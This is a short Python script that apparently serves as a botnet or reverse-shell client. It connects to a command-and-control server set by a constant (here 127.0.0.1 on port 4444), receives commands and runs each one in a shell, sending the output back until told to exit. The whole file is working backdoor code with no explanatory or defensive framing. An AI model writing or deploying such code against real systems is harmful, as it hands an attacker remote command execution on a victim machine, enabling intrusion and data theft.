import socket
import subprocess

C2_SERVER = '127.0.0.1'  # IP server - Alvo
C2_PORT = 4444

def connect_to_c2():
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect((C2_SERVER, C2_PORT))

    while True:
        command = bot.recv(1024).decode()
        if command.strip().lower() == "exit":
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output

        bot.send(output)

    bot.close()

if __name__ == "__main__":
    connect_to_c2()